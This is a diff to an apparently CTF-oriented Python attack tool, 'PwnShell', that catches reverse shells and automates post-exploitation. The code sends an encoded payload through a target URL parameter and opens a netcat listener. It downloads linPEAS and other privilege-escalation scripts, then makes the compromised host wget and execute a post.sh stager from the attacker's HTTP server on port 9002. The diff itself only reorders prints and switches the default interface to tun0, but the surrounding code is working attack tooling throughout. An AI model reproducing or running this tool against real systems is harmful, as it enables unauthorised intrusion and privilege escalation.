@@ -1,7 +1,6 @@
 #!/usr/bin/env python3
 # coding=utf-8
 import netifaces
-import base64
 import os
 import argparse
 import nclib
@@ -30,6 +29,11 @@ class PwnShell:
         self.authentication = args.auth
         self.type = args.type
         self.file = args.file
+
+        if self.ip_address:
+            print(self.ip_address)
+        else:
+            print("PLEASE SPECIFY AN IP ADDRESS")
         ########################################################################
         ###################### Specifying OS ###################################
         if self.type == "linux" or self.type == "l":
@@ -48,7 +52,6 @@ class PwnShell:
         if self.authentication:
             print('[*]USERNAME : %s' % self.authentication[0])
             print('[*]PASSWORD : %s' % self.authentication[1])
-        print('\n[!]Waiting for a Connection ....\n')
 
     ####################################################################################
     ###################################  LINUX #########################################
@@ -84,10 +87,12 @@ class PwnShell:
     ##############################  NC LISTNER + STAGER ###################################
 
     def listener(self):  # setting up the nc listener & stablizing the shell then uploading linpeas to /dev/shm
+        print('\n[!]Waiting for a Connection ....\n')
         nc = nclib.Netcat(listen=('', self.port), verbose=True)
         print('\n[*]Downloading PrivESC Scripts From Github..')
         os.system('curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -o linpeas.sh 2>/dev/null ; curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o LinEnum.sh 2>/dev/null ; curl https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -o linux-exploit-suggester.sh  2>/dev/null ; curl https://raw.githubusercontent.com/flast101/docker-privesc/master/docker-privesc.sh -o docker-privesc.sh 2>/dev/null')
         time.sleep(5)
+        nc.send_line(b"export TERM=xterm-256color")
         send = f'''wget -P /dev/shm http://{self.ip}:9002/post.sh ; clear'''
         nc.send_line(send.encode("utf-8"))
         send = f'''chmod +x /dev/shm/post.sh ; clear ; /dev/shm/post.sh {self.ip}'''
@@ -102,8 +107,7 @@ class PwnShell:
         # Make sure the server is created at current directory
         os.chdir('.')
         # Create server object listening the port 9002
-        server_object = HTTPServer(server_address=(
-            '', 9002), RequestHandlerClass=CGIHTTPRequestHandler)
+        server_object = HTTPServer(server_address=('', 9002), RequestHandlerClass=CGIHTTPRequestHandler)
         # Start the web server
         server_object.serve_forever()
 
@@ -219,9 +223,9 @@ class PwnShell:
                 print(encoded_payload)
             else:
                 url = url.replace("PWNME", encoded_payload)
+                print(url)
                 req = requests.get(url,headers=request,verify=False)
                 print(req.status_code)
-                print(url)
             time.sleep(5)
             if self.is_port_in_use():
                 print("the port is in use")
@@ -253,25 +257,20 @@ if __name__ == '__main__':
             /_/                                                /_/    
             '''
         print(banner)
-        ip_address = netifaces.ifaddresses('eth0')[2][0]['addr']
-        ################################# Arguments Creation ###########################################
-        parser = argparse.ArgumentParser(
-            formatter_class=argparse.ArgumentDefaultsHelpFormatter)
-        parser.add_argument(
-            '-H', '--host', help='LOCAL IP ADDRESS', default=ip_address)
-        parser.add_argument(
-            '-p', '--port', help='LOCAL PORT NUMBER', type=int, default=9001)
-        parser.add_argument(
-            "-t", "--type", help='Payload Type [windows/linux]', type=str, default='linux')
-        parser.add_argument(
-            "-u", "--url", help='Target url [http://localhost:8888/h.php?meow=PWNME]')
+        parser = argparse.ArgumentParser(formatter_class=argparse.ArgumentDefaultsHelpFormatter)
+        try:
+            ip_address = netifaces.ifaddresses('tun0')[2][0]['addr']
+            parser.add_argument('-H', '--host', help='LOCAL IP ADDRESS', default=ip_address)
+        except:
+            parser.add_argument('-H', '--host', help='LOCAL IP ADDRESS',required=True)
+        parser.add_argument('-p', '--port', help='LOCAL PORT NUMBER', type=int, default=9001)
+        parser.add_argument("-t", "--type", help='Payload Type [windows/linux]', type=str, default='linux')
+        parser.add_argument("-u", "--url", help='Target url [http://localhost:8888/h.php?meow=PWNME]')
         parser.add_argument("-d", "--data", help='Post data')
         parser.add_argument("-c", "--cookie", help='Enter Cookie')
         parser.add_argument("-k", "--header", help='Provide header')
-        parser.add_argument(
-            "-m", "--method", help='Request Method', default='post')
-        parser.add_argument(
-            "-a", "--auth", help='[USERNAME PASSWORD]', nargs=2)
+        parser.add_argument("-m", "--method", help='Request Method', default='post')
+        parser.add_argument("-a", "--auth", help='[USERNAME PASSWORD]', nargs=2)
         parser.add_argument("-f", "--file", help='Request file')
         args = parser.parse_args()
         ########################################################################
